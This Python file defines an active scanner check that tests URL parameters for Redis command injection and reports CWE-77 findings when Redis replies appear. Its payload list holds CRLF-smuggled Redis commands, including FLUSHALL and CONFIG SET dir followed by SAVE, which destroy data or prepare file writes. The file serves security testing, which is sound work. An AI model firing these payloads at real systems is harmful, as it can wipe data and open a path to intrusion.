import copy
import httpx
from modules.scanner.base_check import BaseCheck, CheckResult


class RedisInjectionCheck(BaseCheck):
    name = "active_redis_injection"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        payloads = ["\r\nSET injected_key injected_value\r\n", "\r\nFLUSHALL\r\n", "\r\nCONFIG SET dir /tmp\r\n", "\r\nSAVE\r\n"]
        async with httpx.AsyncClient(verify=False, timeout=15, follow_redirects=False) as client:
            for param in target_params:
                for payload in payloads:
                    modified = self._inject_payload(base_request, param, payload)
                    try:
                        resp = await client.request(**modified)
                        if resp.status_code == 200:
                            indicators = ["+OK", "-ERR", "+PONG"]
                            for ind in indicators:
                                if ind in resp.text:
                                    results.append(CheckResult(
                                        triggered=True,
                                        severity="critical",
                                        title="Redis command injection detected",
                                        description=f"Parameter '{param}' may be vulnerable to Redis command injection.",
                                        evidence=f"Payload: {payload[:50]}...\nIndicator: {ind}",
                                        remediation="Sanitize input passed to Redis commands. Use parameterised commands or key-value access patterns.",
                                        cwe="CWE-77",
                                    ))
                                    break
                    except Exception:
                        continue
        return results

    def _inject_payload(self, base: dict, param: str, payload: str) -> dict:
        import urllib.parse
        req = copy.deepcopy(base)
        parsed = urllib.parse.urlparse(req["url"])
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if param in params:
            params[param] = payload
            req["url"] = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
        return req
